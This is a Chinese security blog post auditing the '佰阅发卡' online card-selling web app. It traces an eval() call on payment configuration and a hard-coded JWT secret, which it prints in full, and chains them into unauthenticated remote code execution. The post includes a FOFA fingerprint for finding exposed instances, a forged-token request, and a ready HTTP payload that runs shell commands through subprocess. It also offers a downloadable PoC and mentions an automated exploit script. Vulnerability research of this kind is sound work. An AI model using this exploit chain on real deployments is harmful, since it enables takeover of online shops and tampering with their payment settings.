#  【Python代码审计】佰阅发卡存在前台RCE漏洞   
原创 ReversingByte  星悦安全   2025-04-16 13:09  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
█   
该文章来自零日防线社区版主   
Reversing_Byte 投稿   
█  
  
适用于各种电商、优惠卷、论坛邀请码、充值卡、激活码、注册码、腾讯爱奇艺积分CDK等，支持手工和全自动发货，分层批发模式。 :lollipop:功能特色： Stisla UI：web界面很漂亮 前端使用VUE3.0,毫秒级响应 已集成支付宝当面付、微信官方、Payjs、虎皮椒、易支付、Mugglepay、V免签等十几种支付接口 普通用户支持邮箱、短信接收消息管理员支持邮箱、短信、微信、QQ通知 支持2~4层批发模式  
  
  
FOFA指纹:“Server: gunicorn” && “Content-Length: 728”  
  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQia88WGLMbs1Ml1CtGftJBZD7LzzxIaDmlIYUzCzuxjwlqLkoicZEvHkg/640?wx_fmt=png&from=appmsg "")  
![image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQ3pbVlDkGc2aXFXGTJVA1htljP6ibhEMlYw3EzTvibOfIZNrLnEicwXYkw/640?wx_fmt=jpeg&from=appmsg "")  
![image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQ01DBDaAHWG68Gk4e6zkpic4xrm7Xia2Smae68DuhQ2qWpOvHvpps2iaGQ/640?wx_fmt=jpeg&from=appmsg "")  
## 0x01 漏洞分析  
  
全局搜索上面提及的危险函数**eval()**  
 ，看看有哪个文件使用这个危险函数  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQxLcyISCB46PhZDN5X2ZBKtUhQ6PtU9L9DwfrJv11lXE1r1CtwkqUfw/640?wx_fmt=png&from=appmsg "")  
  
可以看到确实存在这个危险函数然后我们进入**service/database/models.py**  
文件里面查看这段代码的实现  
```
# 定义一个支付方式的数据库模型类，继承自SQLAlchemy的Model基类
class Payment(db.Model):
    __tablename__ = 'payment'  # 指定数据库表名为'payment'
    # 定义主键ID字段，整数类型，自动递增
    id = Column(Integer, primary_key=True, autoincrement=True)
    # 支付接口名称，字符串类型，最大长度50，不允许为空，且必须唯一
    name = Column(String(50), nullable=False, unique=True)  
    # 支付方式的图标路径或URL，字符串类型，最大长度100，不允许为空
    icon = Column(String(100), nullable=False)  
    # 支付接口的配置参数，文本类型，用于存储JSON格式的配置信息
    config = Column(Text)  
    # 支付接口的描述信息，字符串类型，最大长度100
    info = Column(String(100))  
    # 支付接口是否激活的标志，布尔类型，不允许为空，默认为False(未激活)
    isactive = Column(Boolean, nullable=False, default=False)
    # 构造函数，创建Payment对象时初始化各个字段
    def __init__(self, name, icon, config, info, isactive):
        self.name = name        # 设置支付接口名称
        self.icon = icon        # 设置图标
        self.config = config    # 设置配置参数
        self.info = info        # 设置描述信息
        self.isactive = isactive  # 设置激活状态
    # 返回简化版的支付接口信息，只包含基本字段
    # 可能用于前端展示支付方式列表，不包含敏感配置信息
    def enable_json(self):
        return {
            'id': self.id,           # 支付接口ID
            'name': self.name,       # 支付接口名称
            'isactive': self.isactive,  # 是否激活
            'icon': self.icon,       # 图标
        }
    # 返回完整的支付接口信息，包含所有字段
    # 可能用于管理界面展示或编辑支付接口详情
    def all_json(self):
        return {
            'id': self.id,           # 支付接口ID
            'name': self.name,       # 支付接口名称
            'icon': self.icon,       # 图标
            'config': eval(self.config),  # 使用eval()将配置字符串转换为Python对象(存在安全风险)
            'info': self.info,       # 描述信息
            'isactive': self.isactive,  # 是否激活
        }
```  
  
  
  
该类提供两种方法来获取支付方式信息： enable_json()  
：返回基本信息，不含敏感配置信息，主要用于前端展示可用支付方式列表。 all_json()  
：返回完整信息，包括敏感配置信息，用于管理员编辑支付方式配置。  
  
  
重要安全问题：代码使用eval()函数解析配置信息，这极其危险！因为攻击者可能在配置中插入恶意代码并被执行。  
  
  
然后我们需要知道Payment  
 类在那个文件调用了以及使用的是all_json  
 方法，我们在全局搜索一下  
  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQ6AicB3MumpfRgaJ16w51cdr2P8ibIn1ycVOGhcMATYIJsricUSldUrzibg/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到**admin.py**  
中**577**  
行和**585**  
行都调用了这个类方法，我们追踪进去看一下  
  
```
@admin.route('/update_pays', methods=['get','post']) #支付接口get获取详细信息，post升级更新
@jwt_required  # 要求JWT令牌验证，确保用户已登录
def update_pays():
    try:
        if request.method == 'GET':  # 处理GET请求 - 获取支付接口详情
            # 从URL参数中获取支付接口ID
            pay_id = request.args.get('id')
            # 根据ID查询支付接口，获取第一个匹配结果，并调用all_json()方法返回完整信息
            # 然后通过jsonify转换为JSON响应返回给前端
            return jsonify(Payment.query.filter_by(id = pay_id).first().all_json())
      
        else:  # 处理POST请求 - 更新支付接口信息
            # 从请求的JSON数据中获取'data'字段，如果不存在则为None
            data = request.json.get('data', None)
            # 检查是否提供了数据，如果没有则返回400错误
            if not data:
                return 'Missing Data', 400
            # 使用数据库自动提交上下文管理器进行数据库操作
            with db.auto_commit_db():
                # 根据ID查找支付接口并更新三个字段：
                # 1. icon - 图标路径
                # 2. config - 将配置对象转换为字符串存储
                # 3. isactive - 是否激活
                Payment.query.filter_by(id = data['id']).update({
                    'icon': data['icon'],
                    'config': str(data['config']),
                    'isactive': data['isactive']
                })
            # 更新成功后返回成功消息和200状态码
            return '修改成功', 200 
    except Exception as e:  # 捕获所有可能的异常
        # 记录异常到日志
        log(e)
        # 返回通用错误消息和500状态码
        return '数据库异常', 500

```  
  
  
到这里 我们知道了存在漏洞位置以及如何调用这个路由，但是在后台没有登录你是利用不了的，那我们怎么绕过这个限制呢，这里就要介绍另一个漏洞了硬编码  
  
让我们进一步分析代码，在service/api/admin.py  
文件中，我们可以找到初始化管理员账户的代码片段。这段代码包含了重要的硬编码凭据，这可能会导致安全问题。  
  
```
@admin.route('/login', methods=['POST'])  # 定义一个POST方法的路由，路径为/login
@limiter.limit("10/minute;20/hour;40/day", override_defaults=False)  # 限制请求频率：每分钟10次，每小时20次，每天40次
def login():
    try:
        # 从请求的JSON数据中获取email和password
        email = request.json.get('email', None)  # 获取邮箱，如果不存在则为None
        password = request.json.get('password', None)  # 获取密码，如果不存在则为None
      
        # 参数验证：检查是否提供了邮箱
        if not email:
            return '邮箱参数丢失', 400  # 返回400错误
          
        # 参数验证：检查是否提供了密码
        if not password:
            return '密码参数丢失', 400  # 返回400错误
          
        # 根据邮箱查询管理员用户
        user = AdminUser.query.filter_by(email=email).first()
      
        # 检查用户是否存在
        if not user:
            return '账号不存在或密码不正确', 404  # 返回404错误
          
        # 处理密码哈希的兼容性问题（适配MySQL和SQLite）
        try:
            # 尝试将用户密码哈希编码为bytes类型（MySQL模式）
            user_defin = user.hash.encode('utf-8')
        except:
            # 如果编码失败，说明可能已经是bytes类型（SQLite模式）
            user_defin = user.hash

        # 验证密码是否正确
        # bcrypt.checkpw需要两个bytes类型参数：用户输入的密码和数据库中存储的哈希
        if bcrypt.checkpw(password.encode('utf-8'), user_defin):
            # 密码正确，创建JWT访问令牌
            access_token = create_access_token(identity={"email": email})
            # 返回访问令牌和200状态码
            return {"access_token": access_token}, 200
        else:
            # 密码不正确，返回错误信息和400状态码
            return '账号不存在或密码不正确2', 400
          
    except AttributeError as e:
        # 捕获属性错误（可能是请求格式不正确）
        log(e)  # 记录错误到日志
        # 返回错误提示和400状态码
        return 'Provide an Email and Password in JSON format in the request body', 400

```  
  
  
通过上面代码我们可以看到如果用户输入的密码和数据库中存储的哈希验证通过则使用jwt  
创建一个访问令牌，但是jwt  
生成是需要一个密钥，往往这个会使别人没有修改导致可以伪造一个访问令牌  
  
我们全局搜索一下关于jwt配置的关键文件，在service目录下的api目录中找到了db.py  
文件，这个文件包含了jwt的配置信息：  
  
```
app.config['JWT_SECRET_KEY'] = 'EXZgC3BMhPxtu4Kq6W7mo9rAT0yYGsOiQNf5vUInSjRVeb'  # Change this!
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(hours=1)

```  
  
  
可以看到这里使用了硬编码的JWT密钥。这意味着我们可以利用这个密钥来伪造有效的JWT令牌，从而绕过身份验证。  
## 0x02 漏洞复现  
  
1.  
 使用下面代码生成一个临时访问令牌进行验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQPPnk7ZGgwiaEPa0G9F6Wiau1QXlIavlUhZIbg8Lh9yhPLTlYPl8BCYGw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQff25bR24p01QOtfOzn97yBu7Roiaxc5SkibE0PyrEWqCf9LkdeRdR7Cg/640?wx_fmt=png&from=appmsg "")  
  
2.生成成功之后我们发送下面的请求包进行验证  
  
```
GET /api/v4/get_pays HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.xxxxxxxx
Content-Type: application/json

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQNVk9cWczdpJiasJjaqicoFxrHA4ibLpxOQvJJ7nfh8yc0fIpynY2u9t3Q/640?wx_fmt=png&from=appmsg "")  
  
可以看到返回数据了 证明我们生成的Jwt令牌是正确的  
  
3.下面进行命令执行，使用下面POC进行利用  
  
```
POST /api/v4/update_pays HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.xxxxxxxxx
Content-Type: application/json
Content-Length: 257

{"data": {"config": "__import__('subprocess').check_output('whoami', shell=True).decode('utf-8').strip()", "icon": "\u652f\u4ed8\u5b9d", "id": 2, "info": "0\u8d39\u7387\u5b9e\u65f6\u5230\u8d26", "isactive": false, "name": "V\u514d\u7b7e\u652f\u4ed8\u5b9d"}}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQlYKJ4UqUJ1TuqD0xjkiaERRLJGeVPbFabnsbo2Ywib53XpSXrSuLokAA/640?wx_fmt=png&from=appmsg "")  
  
显示发送成功我们再发送第二个包查看信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQicZ2YCQVeWfS113AvyhKSe4SEfCat0ibmPzicKsLiaUQbSO9DVK3fBibgrQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到我们的代码成功执行了，就很棒嘿嘿嘿嘿  
  
自动化漏洞脚本:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5df3ib7hGKatjVUh8eQre9SQo1TLVatjzyMLib72P8K7V92SIcftpRavEJ7gks6NktrQNtpeibXGlq3Q/640?wx_fmt=jpeg&from=appmsg "")  
## 0x03 POC下载  
  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**POC关注公众号发送 250416 获取!**  
  
****  
  
  
优质代码审计社区-零日防线 加入方式:   
  
```
https://mp.weixin.qq.com/s/EFgzGZSc7DGxXZc3DlALtw
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dRh2qJocKRqXsPUaMdtXwOicRKb2g7p9nlbJkJhmssBibAj7DBNY2rjXicoI2Xpmc176zwGzWEIjW9A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
